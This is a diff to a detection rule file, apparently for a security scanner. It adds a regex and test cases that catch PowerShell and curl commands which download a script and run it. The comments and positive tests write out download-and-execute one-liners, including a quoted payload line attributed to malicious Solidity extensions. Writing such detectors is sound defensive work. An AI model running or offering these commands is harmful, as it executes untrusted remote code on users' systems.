@@ -457,6 +457,12 @@ rules:
         - '\b(?:[Ii][Ee][Xx]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ee][Xx][Pp][Rr][Ee][Ss][Ss][Ii][Oo][Nn])\b[ \t]{0,8}\(?[ \t]{0,8}\(?[ \t]{0,8}(?:[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Rr][Ee][Ss][Tt][Mm][Ee][Tt][Hh][Oo][Dd]|[Ii][Rr][Mm]|curl|wget)\b'
         # Fetched to a file, then started, on one line.
         - '\b(?:[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|curl|wget)\b[^\n]{0,200}-[Oo][Uu][Tt][Ff][Ii][Ll][Ee]\b[^\n]{0,200}\b(?:[Ss][Tt][Aa][Rr][Tt]-[Pp][Rr][Oo][Cc][Ee][Ss][Ss]|[Ss][Aa][Pp][Ss])\b'
+        # Fetched to a file and run by name in the next statement: PowerShell's call operator, `start`,
+        # `cmd /c`. `curl.exe -k -L -Ss "https://files.catbox.moe/x.bat" -o $o; & $o` -- the whole
+        # payload of two malicious Solidity extensions, in a `spawn('powershell', ...)` (review 98).
+        # What runs is a variable or an executable's name; a download that is then read or unpacked
+        # is not this.
+        - '\b(?:curl|wget|[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt])(?:\.exe)?\b[^\n;]{0,240}\s(?:-o|--output|-[Oo][Uu][Tt][Ff][Ii][Ll][Ee])\s[^\n;]{0,160};\s{0,4}(?:&|[Ss][Tt][Aa][Rr][Tt](?:-[Pp][Rr][Oo][Cc][Ee][Ss][Ss])?|cmd(?:\.exe)?\s{1,4}/[cC])\s{0,4}["\x27]?(?:\$[\w:]{1,40}\b|[^\s"\x27;]{1,200}\.(?:bat|cmd|exe|ps1|vbs|scr|msi)\b)'
         # The forms with no pipe. `eval "$(curl ...)"` and `IEX (New-Object
         # Net.WebClient).DownloadString(...)` are the two most recognisable
         # lines in the literature after `curl | sh`, and matching only the pipe
@@ -477,6 +483,8 @@ rules:
         - '\b(?:IEX|Invoke-Expression)\b[^\n]{0,120}\b(?:DownloadString|DownloadData|DownloadFile)\b'
     tests:
       positive:
+        - '$o="$env:TEMP\\1.cmd"; & curl.exe -k -L -Ss "https://files.example.invalid/x.bat" -o $o; & $o'
+        - 'curl -k -L -Ss https://files.example.invalid/x.bat -o $env:TEMP\\1.cmd; & $env:TEMP\\1.cmd'
         - "curl -sSL https://example.invalid/x | bash"
         - "eval \"$(curl -fsSL https://example.invalid/i.sh)\""
         - "IEX (New-Object Net.WebClient).DownloadString($u)"
@@ -488,6 +496,8 @@ rules:
         - "Invoke-Expression (Invoke-RestMethod https://example.invalid/x)"
         - "iwr https://example.invalid/p.exe -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe"
       negative:
+        - 'curl -L -o release.json https://api.example.invalid/latest; jq .tag release.json'
+        - 'Invoke-WebRequest https://example.invalid/a.zip -OutFile a.zip; Expand-Archive a.zip'
         - "iwr https://example.invalid/x -OutFile release.zip"
         - "irm https://example.invalid/api/version | ConvertFrom-Json"
         - "ps aux | grep nginx"
